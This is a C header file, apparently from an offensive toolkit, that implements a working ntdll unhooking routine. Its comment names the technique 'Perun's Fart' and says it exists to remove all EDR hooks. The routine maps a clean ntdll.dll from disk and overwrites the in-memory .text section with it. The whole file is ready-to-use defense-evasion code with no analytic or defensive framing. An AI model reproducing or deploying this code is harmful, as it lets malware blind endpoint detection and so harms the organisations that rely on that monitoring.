#ifndef UNHOOK_NTDLL_H
#define UNHOOK_NTDLL_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
   Perun's Fart / Fresh ntdll restoration technique:
   Reads clean ntdll.dll from disk (System32 or KnownDlls)
   and overwrites the .text section of in-memory ntdll to remove all EDR hooks.
   Returns 1 on success, 0 on failure.
*/
static inline int unhook_ntdll(void) {
    HMODULE in_memory_ntdll = GetModuleHandleA("ntdll.dll");
    if (!in_memory_ntdll) return 0;

    char sys_dir[MAX_PATH];
    if (!GetSystemDirectoryA(sys_dir, MAX_PATH)) return 0;

    char ntdll_disk_path[MAX_PATH];
    wsprintfA(ntdll_disk_path, "%s\\ntdll.dll", sys_dir);

    HANDLE hFile = CreateFileA(ntdll_disk_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return 0;
    }

    LPVOID clean_ntdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 0;
    }

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)in_memory_ntdll;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)in_memory_ntdll + dos_header->e_lfanew);

    int success = 0;
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((BYTE*)&nt_headers->OptionalHeader + nt_headers->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (strcmp((char*)section->Name, ".text") == 0) {
            LPVOID target_addr = (BYTE*)in_memory_ntdll + section->VirtualAddress;
            LPVOID source_addr = (BYTE*)clean_ntdll + section->VirtualAddress;
            SIZE_T size = section->Misc.VirtualSize;

            DWORD old_protect;
            if (VirtualProtect(target_addr, size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                memcpy(target_addr, source_addr, size);
                VirtualProtect(target_addr, size, old_protect, &old_protect);
                FlushInstructionCache(GetCurrentProcess(), target_addr, size);
                success = 1;
            }
            break;
        }
    }

    UnmapViewOfFile(clean_ntdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return success;
}

#ifdef __cplusplus
}
#endif

#endif /* UNHOOK_NTDLL_H */
